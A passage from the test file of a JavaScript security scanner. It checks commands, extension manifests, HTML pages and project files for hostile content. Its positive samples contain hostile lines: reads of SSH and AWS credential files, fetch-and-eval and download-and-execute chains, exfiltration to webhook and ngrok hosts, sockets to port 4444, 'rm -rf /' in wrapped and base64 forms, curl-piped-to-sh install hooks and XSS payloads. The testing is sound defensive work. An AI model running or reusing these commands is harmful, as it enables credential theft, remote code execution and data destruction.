  ['fs.readFileSync(path.join(os.homedir(), ".aws/credentials"))', 'readFile("/home/u/.ssh/id_rsa", cb)'],
  ['fs.readFileSync(path.join(storage, "cache.json"))']);
expect('SEC-EXT-010', via.code,
  ['path.join(os.homedir(), ".ssh", "id_rsa")'],
  ['path.join(root, ".config", "app")']);
expect('SEC-EXT-011', via.code,
  ['fetch("http://45.33.32.156/collect")', 'new WebSocket("ws://8.8.4.5:80")'],
  ['fetch("http://192.168.1.5/x")', 'fetch("http://127.0.0.1:3000")', 'fetch("http://1.1.1.1")', 'fetch("https://example.com")']);
expect('SEC-EXT-012', via.code,
  ['sock.connect(4444, "45.33.32.156")', 'net.createConnection({ port: 1 }, "45.33.32.156")'],
  ['sock.connect(4444, "192.168.0.2")', 's.connect(80, "example.com")']);
expect('SEC-EXT-013', via.code,
  ['fetch("https://discord.com/api/webhooks/1/abc")', 'x = "https://abc.ngrok.io/x"', 'x = "https://webhook.site/abc"', 'x = "https://api.telegram.org/bot123:ABC/sendMessage"'],
  ['fetch("https://api.github.com/user")', 'x = "https://discord.com/channels/1/2"']);
expect('SEC-EXT-014', via.code,
  ['fetch(u).then(r=>r.arrayBuffer()).then(b=>{fs.writeFileSync(f,Buffer.from(b));fs.chmodSync(f,0o755);child_process.execFile(f)})'],
  ['fs.chmodSync(p, 0o755)']);
expect('SEC-EXT-015', via.code,
  ['fetch("http://x.example/a").then(r=>r.text()).then(t=>eval(t))'],
  ['fetch("http://x.example").then(r=>r.json())']);
expect('SEC-EXT-016', via.code,
  ['import("https://x.example/a.js")', 'await import(`data:text/javascript,alert(1)`)'],
  ['import("./local.js")']);
expect('SEC-EXT-017', via.code,
  ['JSON.stringify(process.env)'],
  ['JSON.stringify(process.versions)', 'process.env.HOME']);
expect('SEC-EXT-018', via.code,
  ['const u=os.userInfo(),n=os.networkInterfaces();fetch(url,{body:JSON.stringify([u,n])})'],
  ['os.networkInterfaces()', 'os.userInfo()']);
expect('SEC-EXT-019', via.code,
  ['navigator.clipboard.readText()', 'require("clipboardy")'],
  ['navigator.clipboard.writeText(x)']);
expect('SEC-EXT-020', via.code,
  ['require("iohook")', 'import robot from "robotjs"'],
  ['require("fs")', 'require("iohook-docs")']);
expect('SEC-EXT-021', via.code,
  ['new CoinHive.Anonymous("key")', 'fetch("https://authedmine.com/lib/x.js")'],
  ['const coin = 1']);
expect('SEC-EXT-022', via.code,
  ['exec(await fetch(u).then(r=>r.text()))', 'exec(res.text())'],
  ['exec("git status")']);

/* ---- HTML pages ---- */
expect('SEC-HTML-001', via.page, ['<script src="https://cdn.x.example/a.js"></script>', '<script src="//cdn.x.example/a.js"></script>'], ['<script src="a.js"></script>', '<p>hi</p>']);
expect('SEC-HTML-002', via.page, ['<script>alert(1)</script>'], ['<script src="a.js"></script>', '<p>script</p>']);
expect('SEC-HTML-003', via.page, ['<button onclick="go()">x</button>', '<img src=a onerror=alert(1)>'], ['<button class="a">x</button>', '<p>online</p>']);
expect('SEC-HTML-004', via.page, ['<a href="javascript:alert(1)">x</a>'], ['<a href="https://x.example">x</a>']);
expect('SEC-HTML-005', via.page, ['<iframe src="https://x.example"></iframe>'], ['<iframe src="local.html"></iframe>']);
expect('SEC-HTML-006', via.page, ['<meta http-equiv="refresh" content="0; url=https://evil.example">'], ['<meta charset="utf-8">', '<meta http-equiv="refresh" content="5">']);
expect('SEC-HTML-007', via.page, ['<form action="https://x.example/post">'], ['<form action="/local">']);
expect('SEC-HTML-008', via.page, ['<link rel="import" href="x.html">'], ['<link rel="stylesheet" href="a.css">']);
expect('SEC-HTML-009', via.page, ['<object data="https://x.example/a.swf"></object>', '<embed src="//x.example/a">'], ['<object data="a.pdf"></object>']);

/* ---------------------------------------------------------------------- *
 * The checks
 * ---------------------------------------------------------------------- */

/** Every rule has a table entry, and every entry does what it says. */
async function ruleChecks(check) {
  await check('every rule has an id of the form SEC-<AREA>-<NNN> and the ids are unique', () => {
    const seen = new Set();
    for (const rule of RULES) {
      assert.match(rule.id, /^SEC-[A-Z]+(?:-[A-Z]+)?-\d{3}$/, `bad id ${rule.id}`);
      assert.ok(!seen.has(rule.id), `duplicate ${rule.id}`);
      seen.add(rule.id);
      assert.ok(rule.title && rule.message && rule.category, `${rule.id} is missing a text`);
      assert.ok(['critical', 'high', 'medium', 'low', 'info'].includes(rule.severity), `${rule.id} severity`);
      assert.ok(rule.targets.length > 0, `${rule.id} has no target`);
      assert.ok(rule.pattern instanceof RegExp && !rule.pattern.global && !rule.pattern.sticky, `${rule.id} pattern`);
    }
  });

  await check(`there are at least 60 rules (${RULES.length})`, () => assert.ok(RULES.length >= 60));

  await check('every rule has a test table entry, and no entry is orphaned', () => {
    const known = new Set(RULES.map((rule) => rule.id));
    for (const id of known) {
      assert.ok(CASES.has(id), `${id} has no test entry`);
    }
    for (const id of CASES.keys()) {
      assert.ok(known.has(id), `test entry for unknown rule ${id}`);
    }
  });

  for (const [id, { runner, yes, no }] of CASES) {
    const rule = RULES.find((candidate) => candidate.id === id);
    await check(`${id} ${rule?.title ?? ''}: ${yes.length} positive, ${no.length} negative samples`, () => {
      assert.ok(yes.length > 0 && no.length > 0, 'a rule needs positive and negative samples');
      for (const sample of yes) {
        assert.ok(idsOf(runner(sample)).includes(id), `${id} should report: ${JSON.stringify(sample).slice(0, 200)}`);
      }
      for (const sample of no) {
        assert.ok(!idsOf(runner(sample)).includes(id), `${id} should NOT report: ${JSON.stringify(sample).slice(0, 200)}`);
      }
    });
  }
}

/** The tricks of the command normaliser. */
async function commandChecks(check) {
  const ids = (command) => idsOf(scanCommand(command));

  await check('clean everyday commands report nothing', () => {
    for (const command of ['npm install', 'git status', 'ls -la', 'node server.js', 'cargo build --release', 'docker compose up -d', 'echo hello', 'python3 -m venv .venv', 'make -j8', 'curl -s https://api.example.com | jq .name']) {
      assert.deepEqual(ids(command), [], command);
    }
  });

  await check('command and args are joined, args with spaces stay together', () => {
    assert.ok(ids({ command: 'rm', args: ['-rf', '/'] }).includes('SEC-CMD-001'));
    assert.ok(ids({ command: 'bash', args: ['-c', 'rm -rf /'] }).includes('SEC-CMD-001'));
    assert.deepEqual(ids({ command: 'echo', args: ['rm -rf /tmp/x'] }), []);
  });

  await check('line continuations are joined', () => {
    assert.ok(ids('rm \\\n -rf \\\n /').includes('SEC-CMD-001'));
  });

  await check('a leading backslash (\\rm) does not hide a command', () => {
    assert.ok(ids('\\rm -rf /').includes('SEC-CMD-001'));
  });

  await check('chaining with ; && || and & is scanned', () => {
    for (const command of ['echo hi; rm -rf /', 'make && rm -rf /', 'false || rm -rf /', 'sleep 1 & rm -rf /', 'echo $(rm -rf /)', 'echo `rm -rf /`']) {
      assert.ok(ids(command).includes('SEC-CMD-001'), command);
    }
  });

  await check('sh -c, bash -c, eval, powershell -c and cmd /c payloads are unwrapped', () => {
    for (const command of ['sh -c "rm -rf /"', "bash -c 'rm -rf /'", 'eval "rm -rf /"', 'powershell -c "format C:"', 'cmd /c "format C:"', 'sudo su -c "rm -rf /"', 'bash -c "sh -c \\"rm -rf /\\""']) {
      assert.ok(ids(command).some((id) => id === 'SEC-CMD-001' || id === 'SEC-CMD-011'), command);
    }
  });

  await check('unwrapping stops at depth 3', () => {
    const deep = 'rm -rf /';
    const wrap = (inner) => `sh -c '${inner.replace(/'/g, "'\\''")}'`;
    const four = wrap(wrap(wrap(wrap(deep))));
    // Four levels still contain the text itself, so the rule matches the outer line — what matters is that it terminates.
    assert.ok(Array.isArray(scanCommand(four).findings));
  });

  await check('base64 payloads are decoded: dangerous -> critical OBF-001, harmless but executed -> high OBF-002', () => {
    const dangerous = scanCommand('echo cm0gLXJmIC8= | base64 -d | sh');
    assert.equal(dangerous.verdict, 'block');
    assert.ok(idsOf(dangerous).includes('SEC-CMD-OBF-001'));
    const harmless = scanCommand('echo aGVsbG8gd29ybGQ= | base64 -d | sh');
    assert.deepEqual(idsOf(harmless), ['SEC-CMD-OBF-002']);
    assert.equal(harmless.findings[0].severity, 'high');
    assert.deepEqual(idsOf(scanCommand('echo aGVsbG8gd29ybGQ= | base64 -d')), []);
  });

  await check('encoded PowerShell is decoded as UTF-16 and rescanned', () => {
    const encoded = Buffer.from('Invoke-Expression (iwr http://x.example/p)', 'utf16le').toString('base64');
    const report = scanCommand(`powershell -NoProfile -enc ${encoded}`);
    assert.ok(idsOf(report).includes('SEC-CMD-OBF-001'));
    assert.equal(report.verdict, 'block');
  });

  await check('the pure-JS base64 decoder agrees with Buffer, and rejects what is not base64', () => {
    for (const text of ['hello', 'rm -rf /', 'a']) {
      assert.equal(decodeBase64Text(Buffer.from(text).toString('base64')), text.length < 3 ? null : text);
    }
    const unicode = 'héllo wörld ✓ 😀';
    assert.equal(bytesToUtf8(decodeBase64(Buffer.from(unicode).toString('base64'))), unicode);
    assert.deepEqual(decodeBase64('aGk='), [104, 105]);
    assert.equal(decodeBase64Text('not base64 at all!'), null);
    assert.equal(decodeBase64Text('////////'), null);
  });

  await check('sudo escalates a finding one step', () => {
    const plain = scanCommand('chattr +i /etc/x');
    const elevated = scanCommand('sudo chattr +i /etc/x');
    assert.equal(plain.findings[0].severity, 'medium');
    assert.equal(elevated.findings[0].severity, 'high');
    assert.equal(scanCommand('sudo rm -rf /').findings[0].severity, 'critical');
  });

  await check('a decoy comment line or a mention inside echo of a safe path is not a finding', () => {
    assert.deepEqual(ids('# rm -rf /'), []);
    assert.deepEqual(ids('echo "never run rm -rf /tmp/build"'), []);
  });

  await check('multi-line commands report the line of each finding', () => {
    const report = scanText('echo ok\nrm -rf /\n', { kind: 'shell', file: 'x.sh' });
    assert.equal(report.findings[0].line, 2);
    assert.equal(report.findings[0].file, 'x.sh');
    assert.equal(report.findings[0].target, 'project');
  });

  await check('command findings use file "command" and target "command"', () => {
    const finding = scanCommand('rm -rf /').findings[0];
    assert.equal(finding.file, 'command');
    assert.equal(finding.target, 'command');
    assert.equal(finding.excerpt, 'rm -rf /');
  });
}

/** What reaches the scanner as a script file, and where comments are not findings. */
async function textChecks(check) {
  await check('comment lines in scripts are skipped, code lines are not', () => {
    assert.deepEqual(idsOf(scanText('# rm -rf /\n', { kind: 'shell' })), []);
    assert.deepEqual(idsOf(scanText('rem format C:\n:: format C:\n', { kind: 'batch' })), []);
    assert.ok(idsOf(scanText('echo a\nrm -rf /\n', { kind: 'shell' })).includes('SEC-CMD-001'));
  });

  await check('backslash continuations in scripts are joined and report the first line', () => {
    const report = scanText('echo a\ncurl https://x.example \\\n  | sh\n', { kind: 'shell' });
    assert.equal(report.findings[0].id, 'SEC-CMD-019');
    assert.equal(report.findings[0].line, 2);
  });

  await check('EICAR is critical everywhere: commands, files, manifests, projects', () => {
    assert.equal(scanCommand(`echo ${EICAR}`).verdict, 'block');
    assert.equal(scanText(EICAR, { kind: 'any' }).verdict, 'block');
    assert.equal(scanManifest({ code: { main: `const s = "${EICAR.replace(/\\/g, '\\\\')}";` } }).verdict, 'block');
    assert.equal(scanManifest({ code: { main: `// ${EICAR}\n` } }).verdict, 'block');
    assert.equal(scanManifest({ settings: [{ key: 'a', label: 'A', default: EICAR }] }).verdict, 'block');
    assert.equal(scanManifest({ pages: [{ id: 'p', title: 'P', format: 'markdown', content: EICAR }] }).verdict, 'block');
    assert.equal(scanProjectFiles([{ path: 'package.json', text: JSON.stringify({ name: EICAR }) }]).verdict, 'block');
    assert.equal(scanProjectFiles([{ path: 'run.sh', text: EICAR }]).verdict, 'block');
  });

  await check('fingerprints are stable across line moves and differ by file and text', () => {
    const a = scanText('rm -rf /\n', { kind: 'shell', file: 'a.sh' }).findings[0];
    const moved = scanText('\n\n# note\nrm -rf /\n', { kind: 'shell', file: 'a.sh' }).findings[0];
    const other = scanText('rm -rf /\n', { kind: 'shell', file: 'b.sh' }).findings[0];
    const again = scanText('rm -rf /\n', { kind: 'shell', file: 'a.sh' }).findings[0];
    assert.equal(a.fingerprint, again.fingerprint);
    assert.equal(a.fingerprint, moved.fingerprint);
    assert.notEqual(a.fingerprint, other.fingerprint);
    assert.match(a.fingerprint, /^SEC-CMD-001:[0-9a-f]{14}$/);
    assert.notEqual(a.fingerprint, scanText('rm -rf ~\n', { kind: 'shell', file: 'a.sh' }).findings[0].fingerprint);
  });

  await check('excerpts are at most 160 characters', () => {
    const long = `${'x '.repeat(300)}rm -rf / ${'y '.repeat(300)}`;
    for (const finding of scanText(long, { kind: 'shell' }).findings) {
      assert.ok(finding.excerpt.length <= 160);
    }
  });

  await check('verdict policy: critical blocks, high/medium warn, low/info are listed only', () => {
    const f = (severity) => ({ severity });
    assert.equal(verdictOf([]), 'clean');
    assert.equal(verdictOf([f('info'), f('low')]), 'clean');
    assert.equal(verdictOf([f('low'), f('medium')]), 'warn');
    assert.equal(verdictOf([f('high')]), 'warn');
    assert.equal(verdictOf([f('high'), f('critical'), f('low')]), 'block');
    const report = scanManifest({ code: { main: 'require("child_process")' } });
    assert.equal(report.verdict, 'clean');
    assert.deepEqual(summarize(report), { critical: 0, high: 0, medium: 0, low: 0, info: 1 });
  });

  await check('findings are sorted by severity, then file, then line, and repeats are dropped', () => {
    const text = ['chattr +i /a', 'rm -rf /', 'rm -rf /', 'chattr +i /b'].join('\n');
    const report = scanText(text, { kind: 'shell', file: 'x.sh' });
    assert.deepEqual(report.findings.map((finding) => `${finding.severity}:${finding.line}`), ['critical:2', 'critical:3', 'medium:1', 'medium:4']);
    const twice = scanText('rm -rf /; rm -rf /', { kind: 'shell' });
    assert.equal(twice.findings.length, 1);
  });

  await check('findings are capped at 200 and the report says so', () => {
    const text = Array.from({ length: 500 }, () => 'rm -rf /').join('\n');
    const report = scanText(text, { kind: 'shell' });
    assert.equal(report.findings.length, 200);
    assert.equal(report.truncated, true);
  });

  await check('input over 2 MB is cut and the report says so', () => {
    const report = scanText(`${' '.repeat(2 * 1024 * 1024 + 10)}\nrm -rf /\n`, { kind: 'shell' });
    assert.equal(report.truncated, true);
    assert.deepEqual(report.findings, []);
  });

  await check('a 1 MB file is scanned in well under a second', () => {
    const lines = ['#!/bin/sh', 'set -e', 'npm install --save-dev typescript && npm run build', 'echo "building the project, please wait"', 'if [ -f package.json ]; then node scripts/prepare.js; fi', 'git commit -m "update docs" && git push origin main', 'docker build -t app:latest . && docker run --rm -p 8080:80 app:latest', 'curl -s https://api.example.com/status | jq .data.version'];
    let text = '';
    for (let i = 0; text.length < 1024 * 1024; i++) {
      text += `${lines[i % lines.length]} # ${i}\n`;
    }
    for (const kind of ['shell', 'any', 'js', 'json']) {
      const start = Date.now();
      scanText(text, { kind });
      const elapsed = Date.now() - start;
      assert.ok(elapsed < 1000, `${kind}: ${elapsed} ms`);
    }
    const minified = 'function f(a,b){return a.map(x=>x+b).filter(Boolean).join(",")+"hello world"}var x=require("fs");'.repeat(12000);
    const start = Date.now();
    scanManifest({ code: { main: minified.slice(0, 1024 * 1024) } });
    assert.ok(Date.now() - start < 1000, 'minified bundle');
  });

  await check('no rule hangs on pathological lines (every rule, lines up to 2000 characters)', () => {
    const tokens = ['rm', '-rf', '/', '~', '$HOME', 'curl', 'wget', '|', 'sh', '&&', ';', 'sudo', 'docker', 'run', '--privileged', '-v', 'chmod', '-R', 'nc', '-e', '/dev/tcp/', 'a', '=', '"', "'", 'powershell', '-enc', 'AAAA', 'pip', 'install', 'http://', '<script', 'src=', 'fetch(', '(', ')', 'eval(', 'new', 'Function', '.ssh', 'connect(', '1.2.3.4', 'del', '/s', 'C:\\', '-Recurse', '-', '>>', '\\x41', '12,'];
    let seed = 7;
    const random = () => {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      return seed / 0x7fffffff;
    };
    const lines = tokens.map((token) => `${token} `.repeat(Math.floor(2000 / (token.length + 1))));
    for (let n = 0; n < 20; n++) {
      let line = '';
      while (line.length < 2000) {
        line += tokens[Math.floor(random() * tokens.length)] + (random() < 0.8 ? ' ' : '');
      }
      lines.push(line);
    }
    const start = Date.now();
    for (const line of lines) {
      scanText(`${line}\n`, { kind: 'shell' });
      scanText(`${line}\n`, { kind: 'js', target: 'extension' });
      scanCommand(line);
    }
    const elapsed = Date.now() - start;
    assert.ok(elapsed < 6000, `${lines.length} lines took ${elapsed} ms`);
  });
}

/** Extension manifests. */
async function manifestChecks(check) {
  const manifest = (overrides) => ({ id: 'ext.demo', version: '1.0.0', name: 'Demo', addon: { commands: [], languages: [] }, ...overrides });

  await check('a plain manifest is clean', () => {
    const report = scanManifest(manifest({ readme: '# Demo', settings: [{ key: 'a', label: 'A', default: 'x' }], pages: [{ id: 'w', title: 'W', content: '# Hi' }] }));
    assert.equal(report.verdict, 'clean');
    assert.deepEqual(report.findings, []);
    assert.equal(report.rules, RULES.length);
  });

  await check('non-objects are handled', () => {
    for (const value of [null, undefined, 42, 'x', []]) {
      assert.equal(scanManifest(value).verdict, 'clean');
    }
  });

  await check('the readme is never scanned', () => {
    assert.equal(scanManifest(manifest({ readme: 'Never run `rm -rf /` or `curl x | sh`.' })).verdict, 'clean');
  });

  await check('code.main: command rules read string literals only, not comments or identifiers', () => {
    assert.equal(scanManifest(manifest({ code: { main: '// rm -rf /\n/* curl http://x.example | sh */\nconst rm = 1; const x = rm - 1;' } })).verdict, 'clean');
    const hit = scanManifest(manifest({ code: { main: 'const cmd = "rm -rf /";\nexec(cmd);' } }));
    assert.equal(hit.verdict, 'block');
    assert.equal(hit.findings[0].file, 'code.main');
    assert.equal(hit.findings[0].line, 1);
    assert.equal(hit.findings[0].target, 'extension');
  });

  await check('code.main: template literals and escapes are read as the program sees them', () => {
    assert.equal(scanManifest(manifest({ code: { main: 'run(`curl https://x.example/i.sh | sh`);' } })).verdict, 'warn');
    assert.equal(scanManifest(manifest({ code: { main: 'run("rm -rf \\x2f");' } })).verdict, 'block');
    assert.equal(scanManifest(manifest({ code: { main: 'const r = /["\'`]rm -rf \\//; run(`echo ${1 + 1} ok`);' } })).verdict, 'clean');
  });

  await check('code.renderer is scanned too and reported as such', () => {
    const report = scanManifest(manifest({ code: { renderer: 'eval(x)' } }));
    assert.equal(report.findings[0].file, 'code.renderer');
  });

  await check('command rules in an extension are at least high', () => {
    const report = scanManifest(manifest({ code: { main: 'run("chattr +i /etc/x")' } }));
    assert.equal(report.findings[0].severity, 'high');
  });

  await check('pages: html pages are scanned, markdown pages are not', () => {
    const html = '<p>x</p><script>alert(1)</script>';
    assert.ok(idsOf(scanManifest(manifest({ pages: [{ id: 'a', title: 'A', format: 'html', content: html }] }))).includes('SEC-HTML-002'));
    assert.equal(scanManifest(manifest({ pages: [{ id: 'a', title: 'A', format: 'markdown', content: html }] })).verdict, 'clean');
    const report = scanManifest(manifest({ pages: [{ id: 'a', title: 'A', format: 'html', content: html }] }));
    assert.equal(report.findings[0].file, 'page:a');
    assert.equal(report.verdict, 'warn');
  });

  await check('settings defaults and command entries are scanned as commands', () => {
    const settings = scanManifest(manifest({ settings: [{ key: 'run', label: 'R', default: 'curl https://x.example/i.sh | sh' }] }));
    assert.equal(settings.findings[0].file, 'settings[0].default');
    assert.equal(settings.verdict, 'warn');
    const commands = scanManifest(manifest({ commands: [{ id: 'a', title: 'Wipe', category: 'rm -rf /' }] }));
    assert.equal(commands.verdict, 'block');
  });

  await check('the add-on node graph is walked: commands, nested nodes, arrays', () => {
    const addon = { commands: [{ id: 'a' }, { id: 'b' }, { id: 'c' }, { id: 'd', nodes: [{ id: 'n1', run: { command: 'echo hi' } }, { id: 'n2', run: { command: 'rm -rf $HOME' } }] }], languages: [{ id: 'x', keywords: ['rm -rf /'] }] };
    const report = scanManifest(manifest({ addon }));
    assert.equal(report.verdict, 'block');
    assert.equal(report.findings.length, 1, 'language tables are not scanned');
    assert.equal(report.findings[0].file, 'addon.commands[3].nodes[1].run.command');
  });

  await check('add-on template file contents are not scanned, template setup commands are', () => {
    const addon = { templates: [{ id: 't', files: [{ path: 'a.sh', content: 'rm -rf /' }], setup: ['curl https://x.example | sh'] }] };
    const report = scanManifest(manifest({ addon }));
    assert.deepEqual(report.findings.map((finding) => finding.file), ['addon.templates[0].setup[0]']);
  });

  await check('the add-on walk is bounded in depth', () => {
    let deep = { command: 'rm -rf /' };
    for (let i = 0; i < 12; i++) {
      deep = { next: deep };
    }
    assert.equal(scanManifest(manifest({ addon: { commands: [deep] } })).verdict, 'clean');
  });

  await check('the add-on walk is bounded in the number of strings', () => {
    const many = Array.from({ length: 6000 }, (_, i) => `item ${i}`);
    const report = scanManifest(manifest({ addon: { commands: [{ list: many }], tail: ['rm -rf /'] } }));
    assert.equal(report.truncated, true);
  });

  await check('data strings that reach the network are checked for known drop hosts', () => {
    const report = scanManifest(manifest({ settings: [{ key: 'u', label: 'U', default: 'https://webhook.site/abc' }] }));
    assert.ok(idsOf(report).includes('SEC-EXT-013'));
  });

  await check('a miner in extension code is critical', () => {
    assert.equal(scanManifest(manifest({ code: { main: 'const p = "stratum+tcp://pool.example:3333";' } })).verdict, 'block');
    assert.equal(scanManifest(manifest({ code: { main: 'spawn("./xmrig")' } })).verdict, 'block');
  });

  await check('the lexer finds literals, blanks comments and skips regex literals', () => {
    const { code, literals } = lexJs('a("x\\ty"); // note "no"\nb(\'q\'); /* "c" */ c(`t${d("in")}u`); r = /"/;');
    assert.deepEqual(literals.map((literal) => literal.text), ['x\ty', 'q', 'in', 't$Xu']);
    assert.ok(!code.includes('note'));
    assert.ok(!code.includes('"c"'));
    assert.equal(code.length, 'a("x\\ty"); // note "no"\nb(\'q\'); /* "c" */ c(`t${d("in")}u`); r = /"/;'.length);
  });

  await check('JSON with comments and trailing commas parses', () => {
    assert.deepEqual(parseJsonc('{ // c\n "a": [1, 2,], /* x */ "b": "//not a comment", }'), { a: [1, 2], b: '//not a comment' });
    assert.equal(parseJsonc('{ nope'), undefined);
  });
}

/** Every manifest published in addons/dist must pass — the official extensions are legitimate. */
async function distChecks(check) {
  let files = [];
  try {
    files = fs.readdirSync(DIST).filter((name) => name.endsWith('.json'));
  } catch {
    files = [];
  }
  if (!files.length) {
    process.stdout.write('  (no addons/dist here — the official manifests are not scanned)\n');
    return;
  }
  await check(`none of the ${files.length} official manifests in addons/dist is blocked`, () => {
    const warnings = [];
    for (const name of files) {
      const report = scanManifest(JSON.parse(fs.readFileSync(path.join(DIST, name), 'utf8')));
      for (const finding of report.findings.filter((item) => item.severity === 'high' || item.severity === 'medium' || item.severity === 'critical')) {
        warnings.push(`${name}: ${finding.severity} ${finding.id} ${finding.file}:${finding.line} ${JSON.stringify(finding.excerpt).slice(0, 100)}`);
      }
      assert.notEqual(report.verdict, 'block', `${name} is blocked: ${JSON.stringify(report.findings.filter((item) => item.severity === 'critical'))}`);
    }
    if (warnings.length) {
      process.stdout.write(`  warnings in official manifests (review for false positives):\n${warnings.map((line) => `    ${line}`).join('\n')}\n`);
    }
  });
}

/** Project folders. */
async function projectChecks(check) {
  await check('package.json: lifecycle script that pipes curl into sh is flagged by the command rule and SEC-PKG-001', () => {
    const report = scanProjectFiles([{ path: 'package.json', text: PKG({ postinstall: 'curl -s https://x.example/i.sh | sh' }) }]);
    assert.ok(idsOf(report).includes('SEC-CMD-019'));
    assert.ok(idsOf(report).includes('SEC-PKG-001'));
    assert.equal(report.findings[0].file, 'package.json');
    assert.equal(report.findings[0].line, 5);
    assert.equal(report.findings[0].target, 'project');
  });

  await check('package.json: ordinary scripts are clean', () => {
    const report = scanProjectFiles([{ path: 'package.json', text: PKG({ build: 'tsc -p .', test: 'node --test', postinstall: 'node scripts/setup.js', prepare: 'husky install' }) }]);
    assert.deepEqual(report.findings, []);
    assert.equal(report.verdict, 'clean');
  });

  await check('.vscode/tasks.json: folderOpen is medium, and critical when the command is also dangerous', () => {
    const plain = scanProjectFiles([{ path: '.vscode/tasks.json', text: JSON.stringify({ tasks: [{ label: 'dev', command: 'npm run dev', runOptions: { runOn: 'folderOpen' } }] }) }]);
    assert.equal(plain.findings[0].id, 'SEC-PRJ-001');
    assert.equal(plain.findings[0].severity, 'medium');
    const bad = scanProjectFiles([{ path: '.vscode/tasks.json', text: JSON.stringify({ tasks: [{ label: 'x', command: 'curl', args: ['-s', 'https://x.example/i.sh', '|', 'sh'], runOptions: { runOn: 'folderOpen' } }] }) }]);
    assert.equal(bad.verdict, 'block');
    assert.ok(bad.findings.some((finding) => finding.id === 'SEC-PRJ-001' && finding.severity === 'critical'));
    const windows = scanProjectFiles([{ path: '.vscode/tasks.json', text: JSON.stringify({ tasks: [{ label: 'x', command: 'echo', windows: { command: 'powershell', args: ['-enc', 'SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB4ACkA'] }, runOptions: { runOn: 'folderOpen' } }] }) }]);
    assert.ok(idsOf(windows).includes('SEC-CMD-026'));
  });

  await check('devcontainer: initializeCommand (runs on the host) with a download is high', () => {
    const report = scanProjectFiles([{ path: '.devcontainer/devcontainer.json', text: '{ // c\n "initializeCommand": "curl https://x.example/i.sh -o i.sh" }' }]);
    assert.equal(report.findings.find((finding) => finding.id === 'SEC-PRJ-002').severity, 'high');
  });

  await check('Makefile, shell, PowerShell, batch, Dockerfile and CI files go through the command rules', () => {
    const cases = [
      ['Makefile', 'install:\n\t@curl -s https://x.example/i.sh | sh\n'],
      ['scripts/setup.sh', '#!/bin/sh\ncurl https://x.example | bash\n'],
      ['tools/run.ps1', 'iwr http://x.example/a.ps1 | iex\n'],
      ['build.bat', 'del /s /q C:\\\n'],
      ['Dockerfile', 'FROM alpine\nRUN curl https://x.example | sh\n'],
      ['.github/workflows/ci.yml', 'jobs:\n  a:\n    steps:\n      - run: curl https://x.example | sh\n'],
    ];
    for (const [file, text] of cases) {
      assert.ok(scanProjectFiles([{ path: file, text }]).findings.length > 0, file);
    }
    assert.deepEqual(scanProjectFiles([{ path: 'Makefile', text: 'build:\n\tgo build ./...\n# curl https://x.example | sh\n' }]).findings, []);
  });

  await check('executables are reported by name; .bat text is also scanned', () => {
    const report = scanProjectFiles([{ path: 'bin/tool.exe', text: '' }, { path: 'x.bat', text: 'del /s /q C:\\' }]);
    assert.ok(idsOf(report).includes('SEC-PRJ-011'));
    assert.ok(idsOf(report).includes('SEC-CMD-012'));
  });

  await check('ignored directories, unknown files and oversized files are skipped', () => {
    assert.deepEqual(scanProjectFiles([{ path: 'node_modules/x/package.json', text: PKG({ postinstall: 'curl x | sh' }) }]).findings, []);
    assert.deepEqual(scanProjectFiles([{ path: 'README.md', text: 'curl x | sh' }, { path: 'src/a.ts', text: 'rm -rf /' }]).findings, []);
    assert.deepEqual(scanProjectFiles([{ path: 'big.sh', text: 'rm -rf /', size: PROJECT_SCAN.maxFileBytes + 1 }]).findings, []);
    assert.deepEqual(scanProjectFiles(null).findings, []);
    assert.deepEqual(scanProjectFiles([null, { path: 5 }, { path: 'a.sh' }]).findings, []);
  });

  await check('at most maxFiles files are read', () => {
    const files = Array.from({ length: PROJECT_SCAN.maxFiles + 5 }, (_, i) => ({ path: `s${i}.sh`, text: 'echo hi' }));
    const report = scanProjectFiles(files);
    assert.equal(report.truncated, true);
    assert.equal(report.scanned, PROJECT_SCAN.maxFiles);
  });

  await check('PROJECT_SCAN picks the files the scanner reads', () => {
    for (const file of ['package.json', 'Makefile', '.vscode/tasks.json', '.devcontainer/devcontainer.json', 'scripts/a.sh', 'sub/package.json', '.husky/pre-commit', '.github/workflows/ci.yml', 'setup.py', 'x.exe']) {
      assert.ok(isProjectFile(file), file);
    }
    for (const file of ['README.md', 'src/index.ts', 'node_modules/a/package.json', 'dist/run.sh']) {
      assert.ok(!isProjectFile(file), file);
    }
    assert.ok(PROJECT_SCAN.maxFileBytes > 0 && PROJECT_SCAN.maxFiles > 0 && PROJECT_SCAN.ignoredDirs.includes('node_modules'));
    assert.ok(PROJECT_SCAN.executableExtensions.includes('.exe') && PROJECT_SCAN.executableExtensions.includes('.jar'));
  });

  await check('Windows path separators are understood', () => {
    const report = scanProjectFiles([{ path: '.vscode\\tasks.json', text: JSON.stringify({ tasks: [{ label: 'a', command: 'x', runOptions: { runOn: 'folderOpen' } }] }) }]);
    assert.equal(report.findings[0].file, '.vscode/tasks.json');
  });
}

/** Rules supplied by extensions. */
async function customRuleChecks(check) {
  const spec = (overrides = {}) => ({ id: 'no-foo', title: 'No foo', severity: 'high', targets: ['command', 'project'], pattern: 'foo\\s+bar', ...overrides });

  await check('toRule builds a rule with the owner as prefix and applies it', () => {
    const rule = toRule(spec(), 'ext.acme');
    assert.equal(rule.id, 'ext.acme:no-foo');
    assert.equal(rule.severity, 'high');
    assert.ok(idsOf(scanCommand('FOO   bar', { extraRules: [rule] })).includes('ext.acme:no-foo'));
    assert.deepEqual(idsOf(scanCommand('foo baz', { extraRules: [rule] })), []);
    assert.ok(idsOf(scanText('x\nfoo bar\n', { kind: 'shell', extraRules: [rule] })).includes('ext.acme:no-foo'));
    assert.deepEqual(idsOf(scanManifest({ code: { main: 'foo bar' } }, { extraRules: [rule] })), []);
    const extension = toRule(spec({ targets: ['extension'], pattern: 'dangerousCall\\(' }), 'ext.acme');
    assert.ok(idsOf(scanManifest({ code: { main: 'dangerousCall(1)' } }, { extraRules: [extension] })).includes('ext.acme:no-foo'));
    assert.equal(scanManifest({ code: { main: 'dangerousCall(1)' } }, { extraRules: [extension] }).rules, RULES.length + 1);
  });

  await check('toRule rejects malformed specs', () => {
    const owner = 'ext.acme';
    for (const bad of [
      spec({ id: '' }), spec({ id: 'a b' }), spec({ title: '' }), spec({ severity: 'huge' }), spec({ targets: [] }), spec({ targets: ['everything'] }),
      spec({ pattern: '' }), spec({ pattern: 'a'.repeat(501) }), spec({ pattern: '(' }), spec({ pattern: '[a' }), spec({ pattern: 'a*' }), spec({ message: 5 }), null, 'x',
    ]) {
